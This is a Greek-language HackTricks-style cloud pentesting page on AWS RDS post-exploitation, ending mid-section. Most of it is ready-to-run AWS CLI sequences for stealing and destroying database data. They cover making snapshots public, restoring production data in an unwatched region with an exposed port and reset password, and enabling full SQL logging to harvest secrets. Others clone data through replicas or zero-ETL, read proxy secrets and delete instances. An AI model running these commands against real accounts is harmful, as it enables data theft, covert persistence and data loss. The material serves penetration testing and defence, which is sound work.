# AWS - RDS Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## RDS

Για περισσότερες πληροφορίες, δείτε:

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### `rds:CreateDBSnapshot`, `rds:RestoreDBInstanceFromDBSnapshot`, `rds:ModifyDBInstance`

Αν ο attacker έχει επαρκή δικαιώματα, μπορεί να καταστήσει μια **DB δημόσια προσβάσιμη** δημιουργώντας ένα snapshot της DB και στη συνέχεια μια δημόσια προσβάσιμη DB από το snapshot.
```bash
aws rds describe-db-instances # Get DB identifier

aws rds create-db-snapshot \
--db-instance-identifier <db-id> \
--db-snapshot-identifier cloudgoat

# Get subnet groups & security groups
aws rds describe-db-subnet-groups
aws ec2 describe-security-groups

aws rds restore-db-instance-from-db-snapshot \
--db-instance-identifier "new-db-not-malicious" \
--db-snapshot-identifier <scapshotId> \
--db-subnet-group-name <db subnet group> \
--publicly-accessible \
--vpc-security-group-ids <ec2-security group>

aws rds modify-db-instance \
--db-instance-identifier "new-db-not-malicious" \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# Connect to the new DB after a few mins
```
### `rds:ModifyDBSnapshotAttribute`, `rds:CreateDBSnapshot`

Ένας επιτιθέμενος με αυτά τα δικαιώματα θα μπορούσε να **δημιουργήσει ένα snapshot μιας DB** και να το καταστήσει **δημόσια** **διαθέσιμο**. Στη συνέχεια, θα μπορούσε απλά να δημιουργήσει στο δικό του λογαριασμό μια DB από αυτό το snapshot.

Ακόμα κι αν ο επιτιθέμενος **δεν έχει το `rds:CreateDBSnapshot`**, μπορεί παρόλα αυτά να κάνει **άλλα** δημιουργημένα snapshots **δημόσια**.
```bash
# create snapshot
aws rds create-db-snapshot --db-instance-identifier <db-instance-identifier> --db-snapshot-identifier <snapshot-name>

# Make it public/share with attackers account
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
## Specify account IDs instead of "all" to give access only to a specific account: --values-to-add {"111122223333","444455556666"}
```
### `rds:DownloadDBLogFilePortion`

Ένας επιτιθέμενος με την άδεια `rds:DownloadDBLogFilePortion` μπορεί να **κατεβάσει τμήματα των αρχείων καταγραφής μιας RDS instance**. Αν ευαίσθητα δεδομένα ή διαπιστευτήρια πρόσβασης καταγραφούν κατά λάθος, ο επιτιθέμενος ενδεχομένως να χρησιμοποιήσει αυτές τις πληροφορίες για να αυξήσει τα προνόμιά του ή να προβεί σε μη εξουσιοδοτημένες ενέργειες.
```bash
aws rds download-db-log-file-portion --db-instance-identifier target-instance --log-file-name error/mysql-error-running.log --starting-token 0 --output text
```
**Πιθανός Αντίκτυπος**: Πρόσβαση σε ευαίσθητες πληροφορίες ή μη εξουσιοδοτημένες ενέργειες χρησιμοποιώντας leaked credentials.

### `rds:DeleteDBInstance`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να **προκαλέσει DoS σε υπάρχουσες RDS instances**.
```bash
# Delete
aws rds delete-db-instance --db-instance-identifier target-instance --skip-final-snapshot
```
**Πιθανός αντίκτυπος**: Διαγραφή υπαρχόντων RDS instances και πιθανή απώλεια δεδομένων.

### `rds:StartExportTask`

> [!NOTE]
> TODO: Δοκιμή

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **εξάγει ένα στιγμιότυπο RDS instance σε ένα S3 bucket**. Εάν ο επιτιθέμενος έχει τον έλεγχο του προορισμού S3 bucket, μπορεί ενδεχομένως να αποκτήσει πρόσβαση σε ευαίσθητα δεδομένα εντός του εξαγόμενου στιγμιότυπου.
```bash
aws rds start-export-task --export-task-identifier attacker-export-task --source-arn arn:aws:rds:region:account-id:snapshot:target-snapshot --s3-bucket-name attacker-bucket --iam-role-arn arn:aws:iam::account-id:role/export-role --kms-key-id arn:aws:kms:region:account-id:key/key-id
```
**Potential impact**: Πρόσβαση σε ευαίσθητα δεδομένα στο εξαγόμενο snapshot.

### Cross-Region Automated Backups Replication for Stealthy Restore (`rds:StartDBInstanceAutomatedBackupsReplication`)

Κακοποίηση της Cross-Region automated backups replication για να διπλασιαστούν αθόρυβα τα automated backups ενός instance RDS σε άλλη AWS Region και να γίνουν restore εκεί. Ο επιτιθέμενος μπορεί στη συνέχεια να κάνει τη επαναφερθείσα DB δημόσια προσβάσιμη και να επαναφέρει τον master κωδικό πρόσβασης για να αποκτήσει πρόσβαση στα δεδομένα out-of-band σε μια Region που οι αμυνόμενοι μπορεί να μην παρακολουθούν.

Permissions needed (minimum):
- `rds:StartDBInstanceAutomatedBackupsReplication` in the destination Region
- `rds:DescribeDBInstanceAutomatedBackups` in the destination Region
- `rds:RestoreDBInstanceToPointInTime` in the destination Region
- `rds:ModifyDBInstance` in the destination Region
- `rds:StopDBInstanceAutomatedBackupsReplication` (optional cleanup)
- `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress` (to expose the restored DB)

Impact: Επίμονη παρουσία και εξαγωγή δεδομένων επαναφέροντας ένα αντίγραφο παραγωγικών δεδομένων σε άλλη Region και εκθέτοντάς το δημόσια με διαπιστευτήρια υπό τον έλεγχο του επιτιθέμενου.

<details>
<summary>Ολοκληρωμένο CLI (αντικαταστήστε τα placeholders)</summary>
```bash
# 1) Recon (SOURCE region A)
aws rds describe-db-instances \
--region <SOURCE_REGION> \
--query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceArn,Engine,DBInstanceStatus,PreferredBackupWindow]' \
--output table

# 2) Start cross-Region automated backups replication (run in DEST region B)
aws rds start-db-instance-automated-backups-replication \
--region <DEST_REGION> \
--source-db-instance-arn <SOURCE_DB_INSTANCE_ARN> \
--source-region <SOURCE_REGION> \
--backup-retention-period 7

# 3) Wait for replication to be ready in DEST
aws rds describe-db-instance-automated-backups \
--region <DEST_REGION> \
--query 'DBInstanceAutomatedBackups[*].[DBInstanceAutomatedBackupsArn,DBInstanceIdentifier,Status]' \
--output table
# Proceed when Status is "replicating" or "active" and note the DBInstanceAutomatedBackupsArn

# 4) Restore to latest restorable time in DEST
aws rds restore-db-instance-to-point-in-time \
--region <DEST_REGION> \
--source-db-instance-automated-backups-arn <AUTO_BACKUP_ARN> \
--target-db-instance-identifier <TARGET_DB_ID> \
--use-latest-restorable-time \
--db-instance-class db.t3.micro
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 5) Make public and reset credentials in DEST
# 5a) Create/choose an open SG permitting TCP/3306 (adjust engine/port as needed)
OPEN_SG_ID=$(aws ec2 create-security-group --region <DEST_REGION> \
--group-name open-rds-<RAND> --description open --vpc-id <DEST_VPC_ID> \
--query GroupId --output text)
aws ec2 authorize-security-group-ingress --region <DEST_REGION> \
--group-id "$OPEN_SG_ID" \
--ip-permissions IpProtocol=tcp,FromPort=3306,ToPort=3306,IpRanges='[{CidrIp=0.0.0.0/0}]'

# 5b) Publicly expose restored DB and attach the SG
aws rds modify-db-instance --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--publicly-accessible \
--vpc-security-group-ids "$OPEN_SG_ID" \
--apply-immediately
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 5c) Reset the master password
aws rds modify-db-instance --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--master-user-password '<NEW_STRONG_PASSWORD>' \
--apply-immediately
aws rds wait db-instance-available --region <DEST_REGION> --db-instance-identifier <TARGET_DB_ID>

# 6) Connect to <TARGET_DB_ID> endpoint and validate data (example for MySQL)
ENDPOINT=$(aws rds describe-db-instances --region <DEST_REGION> \
--db-instance-identifier <TARGET_DB_ID> \
--query 'DBInstances[0].Endpoint.Address' --output text)
mysql -h "$ENDPOINT" -u <MASTER_USERNAME> -p'<NEW_STRONG_PASSWORD>' -e 'SHOW DATABASES;'

# 7) Optional: stop replication
aws rds stop-db-instance-automated-backups-replication \
--region <DEST_REGION> \
--source-db-instance-arn <SOURCE_DB_INSTANCE_ARN>
```
</details>


### Enable full SQL logging via DB parameter groups and exfiltrate via RDS log APIs

Καταχράσου `rds:ModifyDBParameterGroup` μαζί με τα RDS log download APIs για να καταγράψεις όλες τις SQL εντολές που εκτελούνται από εφαρμογές (δεν απαιτούνται DB engine credentials). Ενεργοποίησε engine SQL logging και κατέβασε τα log αρχεία μέσω `rds:DescribeDBLogFiles` και `rds:DownloadDBLogFilePortion` (ή το REST `downloadCompleteLogFile`). Χρήσιμο για συλλογή queries που μπορεί να περιέχουν secrets/PII/JWTs.

Permissions needed (minimum):
- `rds:DescribeDBInstances`, `rds:DescribeDBLogFiles`, `rds:DownloadDBLogFilePortion`
- `rds:CreateDBParameterGroup`, `rds:ModifyDBParameterGroup`
- `rds:ModifyDBInstance` (only to attach a custom parameter group if the instance is using the default one)
- `rds:RebootDBInstance` (for parameters requiring reboot, e.g., PostgreSQL)

Steps
1) Recon του στόχου και του τρέχοντος parameter group
```bash
aws rds describe-db-instances \
--query 'DBInstances[*].[DBInstanceIdentifier,Engine,DBParameterGroups[0].DBParameterGroupName]' \
--output table
```
2) Βεβαιώσου ότι έχει προσαρτηθεί μια προσαρμοσμένη DB parameter group (δεν μπορείς να επεξεργαστείς την προεπιλεγμένη)
- Αν το instance χρησιμοποιεί ήδη μια προσαρμοσμένη ομάδα, ξαναχρησιμοποίησε το όνομά της στο επόμενο βήμα.
- Διαφορετικά δημιούργησε και επισύναψε μία που ταιριάζει με την οικογένεια του engine:
```bash
# Example for PostgreSQL 16
aws rds create-db-parameter-group \
--db-parameter-group-name ht-logs-pg \
--db-parameter-group-family postgres16 \
--description "HT logging"

aws rds modify-db-instance \
--db-instance-identifier <DB> \
--db-parameter-group-name ht-logs-pg \
--apply-immediately
# Wait until status becomes "available"
```
3) Ενεργοποιήστε λεπτομερή καταγραφή SQL
- MySQL engines (άμεσα / χωρίς επανεκκίνηση):
```bash
aws rds modify-db-parameter-group \
--db-parameter-group-name <PGNAME> \
--parameters \
"ParameterName=general_log,ParameterValue=1,ApplyMethod=immediate" \
"ParameterName=log_output,ParameterValue=FILE,ApplyMethod=immediate"
# Optional extras:
#   "ParameterName=slow_query_log,ParameterValue=1,ApplyMethod=immediate" \
#   "ParameterName=long_query_time,ParameterValue=0,ApplyMethod=immediate"
```
- PostgreSQL engines (απαιτείται επανεκκίνηση):
```bash
aws rds modify-db-parameter-group \
--db-parameter-group-name <PGNAME> \
--parameters \
"ParameterName=log_statement,ParameterValue=all,ApplyMethod=pending-reboot"
# Optional to log duration for every statement:
#   "ParameterName=log_min_duration_statement,ParameterValue=0,ApplyMethod=pending-reboot"

# Reboot if any parameter is pending-reboot
aws rds reboot-db-instance --db-instance-identifier <DB>
```
4) Αφήστε το workload να εκτελεστεί (ή δημιουργήστε queries). Οι δηλώσεις θα καταγραφούν στα engine file logs
- MySQL: `general/mysql-general.log`
- PostgreSQL: `postgresql.log`

5) Εντοπίστε και κατεβάστε τα logs (δεν απαιτούνται διαπιστευτήρια DB)
```bash
aws rds describe-db-log-files --db-instance-identifier <DB>

# Pull full file via portions (iterate until AdditionalDataPending=false). For small logs a single call is enough:
aws rds download-db-log-file-portion \
--db-instance-identifier <DB> \
--log-file-name general/mysql-general.log \
--starting-token 0 \
--output text > dump.log
```
6) Αναλύστε εκτός σύνδεσης για ευαίσθητα δεδομένα
```bash
grep -Ei "password=|aws_access_key_id|secret|authorization:|bearer" dump.log | sed 's/\(aws_access_key_id=\)[A-Z0-9]*/\1AKIA.../; s/\(secret=\).*/\1REDACTED/; s/\(Bearer \).*/\1REDACTED/' | head
```
Παράδειγμα αποδεικτικών στοιχείων (αποκρυμμένα):
```text
2025-10-06T..Z    13 Query  INSERT INTO t(note) VALUES ('user=alice password=Sup3rS3cret!')
2025-10-06T..Z    13 Query  INSERT INTO t(note) VALUES ('authorization: Bearer REDACTED')
2025-10-06T..Z    13 Query  INSERT INTO t(note) VALUES ('aws_access_key_id=AKIA... secret=REDACTED')
```
Καθαρισμός
- Επαναφέρετε τις παραμέτρους στις προεπιλεγμένες τιμές και επανεκκινήστε εάν απαιτείται:
```bash
# MySQL
aws rds modify-db-parameter-group \
--db-parameter-group-name <PGNAME> \
--parameters \
"ParameterName=general_log,ParameterValue=0,ApplyMethod=immediate"

# PostgreSQL
aws rds modify-db-parameter-group \
--db-parameter-group-name <PGNAME> \
--parameters \
"ParameterName=log_statement,ParameterValue=none,ApplyMethod=pending-reboot"
# Reboot if pending-reboot
```
Επίπτωση: Post-exploitation πρόσβαση σε δεδομένα με την καταγραφή όλων των SQL εντολών της εφαρμογής μέσω AWS APIs (no DB creds), πιθανώς leaking μυστικά, JWTs, και PII.

### `rds:CreateDBInstanceReadReplica`, `rds:ModifyDBInstance`

Καταχρήση των RDS read replicas για απόκτηση out-of-band read access χωρίς να πειραχτούν τα primary instance credentials. Ένας attacker μπορεί να δημιουργήσει ένα read replica από ένα production instance, να επαναφέρει το replica's master password (αυτό δεν αλλάζει το primary), και προαιρετικά να εκθέσει το replica δημόσια για να exfiltrate δεδομένα.

Απαιτούμενα permissions (ελάχιστα):
- `rds:DescribeDBInstances`
- `rds:CreateDBInstanceReadReplica`
- `rds:ModifyDBInstance`
- `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress` (if exposing publicly)

Επίπτωση: Read-only πρόσβαση σε production δεδομένα μέσω ενός replica με attacker-controlled credentials; χαμηλότερη πιθανότητα ανίχνευσης καθώς το primary παραμένει untouched και η replication συνεχίζεται.
```bash
# 1) Recon: find non-Aurora sources with backups enabled
aws rds describe-db-instances \
--query 'DBInstances[*].[DBInstanceIdentifier,Engine,DBInstanceArn,DBSubnetGroup.DBSubnetGroupName,VpcSecurityGroups[0].VpcSecurityGroupId,PubliclyAccessible]' \
--output table

# 2) Create a permissive SG (replace <VPC_ID> and <YOUR_IP/32>)
aws ec2 create-security-group --group-name rds-repl-exfil --description 'RDS replica exfil' --vpc-id <VPC_ID> --query GroupId --output text
aws ec2 authorize-security-group-ingress --group-id <SGID> --ip-permissions '[{"IpProtocol":"tcp","FromPort":3306,"ToPort":3306,"IpRanges":[{"CidrIp":"<YOUR_IP/32>","Description":"tester"}]}]'

# 3) Create the read replica (optionally public)
aws rds create-db-instance-read-replica \
--db-instance-identifier <REPL_ID> \
--source-db-instance-identifier <SOURCE_DB> \
--db-instance-class db.t3.medium \
--publicly-accessible \
--vpc-security-group-ids <SGID>
aws rds wait db-instance-available --db-instance-identifier <REPL_ID>

# 4) Reset ONLY the replica master password (primary unchanged)
aws rds modify-db-instance --db-instance-identifier <REPL_ID> --master-user-password 'NewStr0ng!Passw0rd' --apply-immediately
aws rds wait db-instance-available --db-instance-identifier <REPL_ID>

# 5) Connect and dump (use the SOURCE master username + NEW password)
REPL_ENDPOINT=$(aws rds describe-db-instances --db-instance-identifier <REPL_ID> --query 'DBInstances[0].Endpoint.Address' --output text)
# e.g., with mysql client:  mysql -h "$REPL_ENDPOINT" -u <MASTER_USERNAME> -p'NewStr0ng!Passw0rd' -e 'SHOW DATABASES; SELECT @@read_only, CURRENT_USER();'

# Optional: promote for persistence
# aws rds promote-read-replica --db-instance-identifier <REPL_ID>
```
Παράδειγμα αποδεικτικών στοιχείων (MySQL):
- Κατάσταση Replica DB: `available`, read replication: `replicating`
- Επιτυχής σύνδεση με νέο κωδικό και `@@read_only=1` που επιβεβαιώνει πρόσβαση μόνο για ανάγνωση στο αντίγραφο.

### `rds:CreateBlueGreenDeployment`, `rds:ModifyDBInstance`

Καταχρήση του RDS Blue/Green για κλωνοποίηση μιας παραγωγικής DB σε ένα συνεχώς αναπαραγόμενο, μόνο για ανάγνωση green περιβάλλον. Στη συνέχεια επαναφέρετε τα κύρια διαπιστευτήρια του green για να αποκτήσετε πρόσβαση στα δεδομένα χωρίς να αγγίξετε το blue (prod) instance. Αυτό είναι πιο διακριτικό από την κοινή χρήση snapshot και συχνά παρακάμπτει την παρακολούθηση που εστιάζει μόνο στην πηγή.
```bash
# 1) Recon – find eligible source (non‑Aurora MySQL/PostgreSQL in the same account)
aws rds describe-db-instances \
--query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceArn,Engine,EngineVersion,DBSubnetGroup.DBSubnetGroupName,PubliclyAccessible]'

# Ensure: automated backups enabled on source (BackupRetentionPeriod > 0), no RDS Proxy, supported engine/version

# 2) Create Blue/Green deployment (replicates blue->green continuously)
aws rds create-blue-green-deployment \
--blue-green-deployment-name ht-bgd-attack \
--source <BLUE_DB_ARN> \
# Optional to upgrade: --target-engine-version <same-or-higher-compatible>

# Wait until deployment Status becomes AVAILABLE, then note the green DB id
aws rds describe-blue-green-deployments \
--blue-green-deployment-identifier <BGD_ID> \
--query 'BlueGreenDeployments[0].SwitchoverDetails[0].TargetMember'

# Typical green id: <blue>-green-XXXX

# 3) Reset the green master password (does not affect blue)
aws rds modify-db-instance \
--db-instance-identifier <GREEN_DB_ID> \
--master-user-password 'Gr33n!Exfil#1' \
--apply-immediately

# Optional: expose the green for direct access (attach an SG that allows the DB port)
aws rds modify-db-instance \
--db-instance-identifier <GREEN_DB_ID> \
--publicly-accessible \
--vpc-security-group-ids <SG_ALLOWING_DB_PORT> \
--apply-immediately

# 4) Connect to the green endpoint and query/exfiltrate (green is read‑only)
aws rds describe-db-instances \
--db-instance-identifier <GREEN_DB_ID> \
--query 'DBInstances[0].Endpoint.Address' --output text

# Then connect with the master username and the new password and run SELECT/dumps
# e.g. MySQL: mysql -h <endpoint> -u <master_user> -p'Gr33n!Exfil#1'

# 5) Cleanup – remove blue/green and the green resources
aws rds delete-blue-green-deployment \
--blue-green-deployment-identifier <BGD_ID> \
--delete-target true
```
Αντίκτυπος: Πρόσβαση μόνο για ανάγνωση αλλά πλήρης πρόσβαση στα δεδομένα σε έναν σχεδόν-σε-πραγματικό-χρόνο κλώνο του production χωρίς να τροποποιηθεί το production instance. Χρήσιμο για στελθ εξαγωγή δεδομένων και ανάλυση εκτός σύνδεσης.


### Out-of-band SQL via RDS Data API by enabling HTTP endpoint + resetting master password

Κακοποίηση του Aurora για την ενεργοποίηση του RDS Data API HTTP endpoint σε έναν στοχευμένο cluster, επαναφορά του master password σε μια τιμή που ελέγχετε και εκτέλεση SQL πάνω από HTTPS (χωρίς απαιτούμενο VPC network path). Λειτουργεί σε Aurora engines που υποστηρίζουν το Data API/EnableHttpEndpoint (π.χ., Aurora MySQL 8.0 provisioned; κάποιες εκδόσεις Aurora PostgreSQL/MySQL).

Permissions (minimum):
- rds:DescribeDBClusters, rds:ModifyDBCluster (or rds:EnableHttpEndpoint)
- secretsmanager:CreateSecret
- rds-data:ExecuteStatement (and rds-data:BatchExecuteStatement if used)

Αντίκτυπος: Παράκαμψη της δικτυακής τμηματοποίησης και εξαγωγή δεδομένων μέσω AWS APIs χωρίς άμεση VPC connectivity στη DB.

<details>
<summary>CLI από άκρο σε άκρο (παράδειγμα Aurora MySQL)</summary>
```bash
# 1) Identify target cluster ARN
REGION=us-east-1
CLUSTER_ID=<target-cluster-id>
CLUSTER_ARN=$(aws rds describe-db-clusters --region $REGION \
--db-cluster-identifier $CLUSTER_ID \
--query 'DBClusters[0].DBClusterArn' --output text)

# 2) Enable Data API HTTP endpoint on the cluster
# Either of the following (depending on API/engine support):
aws rds enable-http-endpoint --region $REGION --resource-arn "$CLUSTER_ARN"
# or
aws rds modify-db-cluster --region $REGION --db-cluster-identifier $CLUSTER_ID \
--enable-http-endpoint --apply-immediately

# Wait until HttpEndpointEnabled is True
aws rds wait db-cluster-available --region $REGION --db-cluster-identifier $CLUSTER_ID
aws rds describe-db-clusters --region $REGION --db-cluster-identifier $CLUSTER_ID \
--query 'DBClusters[0].HttpEndpointEnabled' --output text

# 3) Reset master password to attacker-controlled value
aws rds modify-db-cluster --region $REGION --db-cluster-identifier $CLUSTER_ID \
--master-user-password 'Sup3rStr0ng!1' --apply-immediately
# Wait until pending password change is applied
while :; do
aws rds wait db-cluster-available --region $REGION --db-cluster-identifier $CLUSTER_ID
P=$(aws rds describe-db-clusters --region $REGION --db-cluster-identifier $CLUSTER_ID \
--query 'DBClusters[0].PendingModifiedValues.MasterUserPassword' --output text)
[[ "$P" == "None" || "$P" == "null" ]] && break
sleep 10
done

# 4) Create a Secrets Manager secret for Data API auth
SECRET_ARN=$(aws secretsmanager create-secret --region $REGION --name rdsdata/demo-$CLUSTER_ID \
--secret-string '{"username":"admin","password":"Sup3rStr0ng!1"}' \
--query ARN --output text)

# 5) Prove out-of-band SQL via HTTPS using rds-data
# (Example with Aurora MySQL; for PostgreSQL, adjust SQL and username accordingly)
aws rds-data execute-statement --region $REGION --resource-arn "$CLUSTER_ARN" \
--secret-arn "$SECRET_ARN" --database mysql --sql "create database if not exists demo;"
aws rds-data execute-statement --region $REGION --resource-arn "$CLUSTER_ARN" \
--secret-arn "$SECRET_ARN" --database demo --sql "create table if not exists pii(note text);"
aws rds-data execute-statement --region $REGION --resource-arn "$CLUSTER_ARN" \
--secret-arn "$SECRET_ARN" --database demo --sql "insert into pii(note) values ('token=SECRET_JWT');"
aws rds-data execute-statement --region $REGION --resource-arn "$CLUSTER_ARN" \
--secret-arn "$SECRET_ARN" --database demo --sql "select current_user(), now(), (select count(*) from pii) as row_count;" \
--format-records-as JSON
```
</details>

Σημειώσεις:
- Εάν το SQL πολλών εντολών απορριφθεί από το `rds-data`, εκτελέστε ξεχωριστές κλήσεις `execute-statement`.
- Για μηχανές όπου το `modify-db-cluster --enable-http-endpoint` δεν έχει αποτέλεσμα, χρησιμοποιήστε `rds enable-http-endpoint --resource-arn`.
- Βεβαιωθείτε ότι η μηχανή/έκδοση υποστηρίζει πραγματικά το Data API· διαφορετικά το `HttpEndpointEnabled` θα παραμείνει `False`.


### Συλλογή διαπιστευτηρίων DB μέσω RDS Proxy auth secrets (`rds:DescribeDBProxies` + `secretsmanager:GetSecretValue`)

Καταχρηστείτε τη διαμόρφωση του RDS Proxy για να εντοπίσετε το Secrets Manager secret που χρησιμοποιείται για την πιστοποίηση του backend, και στη συνέχεια διαβάστε το secret για να αποκτήσετε διαπιστευτήρια βάσης δεδομένων. Σε πολλά περιβάλλοντα χορηγείται ευρεία άδεια `secretsmanager:GetSecretValue`, καθιστώντας αυτή μια εύκολη μεταπήδηση προς διαπιστευτήρια DB. Εάν το secret χρησιμοποιεί CMK, κακώς ορισμένα δικαιώματα KMS μπορεί επίσης να επιτρέψουν `kms:Decrypt`.

Απαιτούμενα δικαιώματα (ελάχιστα):
- `rds:DescribeDBProxies`
- `secretsmanager:GetSecretValue` στο αναφερόμενο SecretArn
- Προαιρετικό όταν το secret χρησιμοποιεί CMK: `kms:Decrypt` στο συγκεκριμένο κλειδί

Impact: Άμεση αποκάλυψη του DB username/password που έχει ρυθμιστεί στον proxy· επιτρέπει άμεση πρόσβαση στη DB ή περαιτέρω lateral movement.

Βήματα
```bash
# 1) Enumerate proxies and extract the SecretArn used for auth
aws rds describe-db-proxies \
--query DBProxies[*].[DBProxyName,Auth[0].AuthScheme,Auth[0].SecretArn] \
--output table

# 2) Read the secret value (common over-permission)
aws secretsmanager get-secret-value \
--secret-id <SecretArnFromProxy> \
--query SecretString --output text
# Example output: {"username":"admin","password":"S3cr3t!"}
```
Εργαστήριο (ελάχιστο για αναπαραγωγή)
```bash
REGION=us-east-1
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
SECRET_ARN=$(aws secretsmanager create-secret \
--region $REGION --name rds/proxy/aurora-demo \
--secret-string username:admin \
--query ARN --output text)
aws iam create-role --role-name rds-proxy-secret-role \
--assume-role-policy-document Version:2012-10-17
aws iam attach-role-policy --role-name rds-proxy-secret-role \
--policy-arn arn:aws:iam::aws:policy/SecretsManagerReadWrite
aws rds create-db-proxy --db-proxy-name p0 --engine-family MYSQL \
--auth [AuthScheme:SECRETS] \
--role-arn arn:aws:iam::$ACCOUNT_ID:role/rds-proxy-secret-role \
--vpc-subnet-ids $(aws ec2 describe-subnets --filters Name=default-for-az,Values=true --query Subnets[].SubnetId --output text)
aws rds wait db-proxy-available --db-proxy-name p0
# Now run the enumeration + secret read from the Steps above
```
Καθαρισμός (εργαστήριο)
```bash
aws rds delete-db-proxy --db-proxy-name p0
aws iam detach-role-policy --role-name rds-proxy-secret-role --policy-arn arn:aws:iam::aws:policy/SecretsManagerReadWrite
aws iam delete-role --role-name rds-proxy-secret-role
aws secretsmanager delete-secret --secret-id rds/proxy/aurora-demo --force-delete-without-recovery
```
### Κρυφή συνεχής εξαγωγή δεδομένων μέσω Aurora zero‑ETL σε Amazon Redshift (rds:CreateIntegration)

Καταχραστείτε την ολοκλήρωση Aurora PostgreSQL zero‑ETL για να αναπαράγετε συνεχώς παραγωγικά δεδομένα σε ένα Redshift Serverless namespace που ελέγχετε. Με μια χαλαρή πολιτική πόρων Redshift που εξουσιοδοτεί τα CreateInboundIntegration/AuthorizeInboundIntegration για ένα συγκεκριμένο Aurora cluster ARN, ένας επιτιθέμενος μπορεί να δημιουργήσει ένα σχεδόν πραγματικού χρόνου αντίγραφο δεδομένων χωρίς DB creds, snapshots ή έκθεση στο δίκτυο.

Απαιτούμενα δικαιώματα (ελάχιστα):
- `rds:CreateIntegration`, `rds:DescribeIntegrations`, `rds:DeleteIntegration`
- `redshift:PutResourcePolicy`, `redshift:DescribeInboundIntegrations`, `redshift:DescribeIntegrations`
- `redshift-data:ExecuteStatement/GetStatementResult/ListDatabases` (to query)
- `rds-data:ExecuteStatement` (optional; to seed data if needed)

Δοκιμάστηκε σε: us-east-1, Aurora PostgreSQL 16.4 (Serverless v2), Redshift Serverless.

<details>
<summary>1) Δημιουργία Redshift Serverless namespace + workgroup</summary>
```bash
REGION=us-east-1
RS_NS_ARN=$(aws redshift-serverless create-namespace --region $REGION --namespace-name ztl-ns \
--admin-username adminuser --admin-user-password 'AdminPwd-1!' \
--query namespace.namespaceArn --output text)
RS_WG_ARN=$(aws redshift-serverless create-workgroup --region $REGION --workgroup-name ztl-wg \
--namespace-name ztl-ns --base-capacity 8 --publicly-accessible \
--query workgroup.workgroupArn --output text)
# Wait until AVAILABLE, then enable case sensitivity (required for PostgreSQL)
aws redshift-serverless update-workgroup --region $REGION --workgroup-name ztl-wg \
--config-parameters parameterKey=enable_case_sensitive_identifier,parameterValue=true
```
</details>

<details>
<summary>2) Διαμόρφωση πολιτικής πόρων Redshift για να επιτραπεί η πηγή Aurora</summary>
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
SRC_ARN=<AURORA_CLUSTER_ARN>
cat > rs-rp.json <<JSON
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AuthorizeInboundByRedshiftService",
"Effect": "Allow",
"Principal": {"Service": "redshift.amazonaws.com"},
"Action": "redshift:AuthorizeInboundIntegration",
"Resource": "$RS_NS_ARN",
"Condition": {"StringEquals": {"aws:SourceArn": "$SRC_ARN"}}
},
{
"Sid": "AllowCreateInboundFromAccount",
"Effect": "Allow",
"Principal": {"AWS": "arn:aws:iam::$ACCOUNT_ID:root"},
"Action": "redshift:CreateInboundIntegration",
"Resource": "$RS_NS_ARN"
}
]
}
JSON
aws redshift put-resource-policy --region $REGION --resource-arn "$RS_NS_ARN" --policy file://rs-rp.json
```
</details>

<details>
<summary>3) Δημιουργία Aurora PostgreSQL cluster (ενεργοποίηση Data API και logical replication)</summary>
```bash
CLUSTER_ID=aurora-ztl
aws rds create-db-cluster --region $REGION --db-cluster-identifier $CLUSTER_ID \
--engine aurora-postgresql --engine-version 16.4 \
--master-username postgres --master-user-password 'InitPwd-1!' \
--enable-http-endpoint --no-deletion-protection --backup-retention-period 1
aws rds wait db-cluster-available --region $REGION --db-cluster-identifier $CLUSTER_ID
# Serverless v2 instance
aws rds modify-db-cluster --region $REGION --db-cluster-identifier $CLUSTER_ID \
--serverless-v2-scaling-configuration MinCapacity=0.5,MaxCapacity=1 --apply-immediately
aws rds create-db-instance --region $REGION --db-instance-identifier ${CLUSTER_ID}-instance-1 \
--db-instance-class db.serverless --engine aurora-postgresql --db-cluster-identifier $CLUSTER_ID
aws rds wait db-instance-available --region $REGION --db-instance-identifier ${CLUSTER_ID}-instance-1
# Cluster parameter group for zero‑ETL
aws rds create-db-cluster-parameter-group --region $REGION --db-cluster-parameter-group-name apg16-ztl-zerodg \
--db-parameter-group-family aurora-postgresql16 --description "APG16 zero-ETL params"
aws rds modify-db-cluster-parameter-group --region $REGION --db-cluster-parameter-group-name apg16-ztl-zerodg --parameters \
ParameterName=rds.logical_replication,ParameterValue=1,ApplyMethod=pending-reboot \
ParameterName=aurora.enhanced_logical_replication,ParameterValue=1,ApplyMethod=pending-reboot \
ParameterName=aurora.logical_replication_backup,ParameterValue=0,ApplyMethod=pending-reboot \
ParameterName=aurora.logical_replication_globaldb,ParameterValue=0,ApplyMethod=pending-reboot
aws rds modify-db-cluster --region $REGION --db-cluster-identifier $CLUSTER_ID \
--db-cluster-parameter-group-name apg16-ztl-zerodg --apply-immediately
aws rds reboot-db-instance --region $REGION --db-instance-identifier ${CLUSTER_ID}-instance-1
aws rds wait db-instance-available --region $REGION --db-instance-identifier ${CLUSTER_ID}-instance-1
SRC_ARN=$(aws rds describe-db-clusters --region $REGION --db-cluster-identifier $CLUSTER_ID --query 'DBClusters[0].DBClusterArn' --output text)
```
</details>

<details>
<summary>4) Δημιουργήστε την zero‑ETL ενσωμάτωση από το RDS</summary>
```bash
# Include all tables in the default 'postgres' database
aws rds create-integration --region $REGION --source-arn "$SRC_ARN" \
--target-arn "$RS_NS_ARN" --integration-name ztl-demo \
--data-filter 'include: postgres.*.*'
# Redshift inbound integration should become ACTIVE
aws redshift describe-inbound-integrations --region $REGION --target-arn "$RS_NS_ARN"
```
</details>

<details>
